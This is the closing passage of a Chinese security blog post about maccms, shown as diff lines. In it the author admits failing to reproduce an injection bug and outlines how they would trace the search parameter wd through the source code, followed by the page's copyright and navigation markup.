+<h2 id="最后还是没复现成功-真的是很心塞啊"><a href="#最后还是没复现成功-真的是很心塞啊" class="headerlink" title="最后还是没复现成功,真的是很心塞啊!"></a>最后还是没复现成功,真的是很心塞啊!</h2><p>   我觉得这个文章的顺序有点问题.. 作者先是一眼看出拼接进去的lp[wd]存在注入,再回头溯源发现wd是可控的.可能还是我太菜了.<br>   按我理解的应该是抓取搜索框发出的包,发现wd参数可控,再到源码层里去追踪wd参数的去向,并记录一下该参数被哪些函数处理过.</p>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>zhhhy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2018/10/17/maccms/">http://yoursite.com/2018/10/17/maccms/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Solgan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2018/10/26/file-put-contents/">file_put_contents</a>
+            
+            
+            <a class="next" rel="next" href="/2018/10/14/RCE/">RCE</a>
+            
+        </section>
+
+
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© zhhhy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+    </div>
+</body>
+</html>
